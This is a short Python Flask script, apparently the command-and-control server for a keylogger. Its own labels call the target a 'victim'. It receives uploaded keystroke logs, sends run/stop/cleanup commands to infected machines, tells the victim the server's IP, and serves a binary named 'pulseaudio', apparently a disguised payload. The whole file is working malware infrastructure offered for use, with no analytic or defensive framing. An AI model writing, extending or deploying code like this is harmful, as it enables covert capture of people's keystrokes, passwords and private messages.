# listener.py
from flask import Flask, request, send_file
import os

app = Flask(__name__)
LOG_DIR = 'received_logs'
CONTROL_FILE = 'control.txt'
IP_FILE = 'ip.txt'

os.makedirs(LOG_DIR, exist_ok=True)
with open(CONTROL_FILE, 'w') as f:
    f.write("run")  # default state

@app.route('/')
def index():
    return 'Keylogger Control Server'

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    if file:
        path = os.path.join(LOG_DIR, 'keylog.txt')
        file.save(path)
        return 'File received\n', 200
    return 'No file\n', 400

@app.route('/control')
def control():
    with open(CONTROL_FILE, 'r') as f:
        return f.read()

@app.route('/set/<cmd>')
def set_command(cmd):
    if cmd not in ["run", "stop", "cleanup"]:
        return "Invalid command\n", 400
    with open(CONTROL_FILE, 'w') as f:
        f.write(cmd)
    return f"Set to: {cmd}\n"

@app.route('/logs')
def download_logs():
    return send_file(os.path.join(LOG_DIR, 'keylog.txt'), as_attachment=True)

@app.route('/ip', methods=['GET'])
def get_ip():
    return request.remote_addr

@app.route('/ip.txt')
def get_ip_file():
    return send_file(IP_FILE)
    
@app.route('/pulseaudio', methods=['GET'])
def get_binary():
    path = os.path.join(os.path.dirname(__file__), "pulseaudio")
    return send_file(path, as_attachment=True)


if __name__ == '__main__':
    print("[*] Control commands: run | stop | cleanup | exit")
    print("Control> [+] Server started on port 8080")
    print("[*] Available endpoints:")
    print("  - /ip.txt → Victim fetches IP")
    print("  - /control → Send commands: run, stop, cleanup")
    print("  - /upload → Victim uploads logs")
    print("  - /pulseaudio → Victim downloads binary")
    print()
    
    app.run(host='0.0.0.0', port=8080)


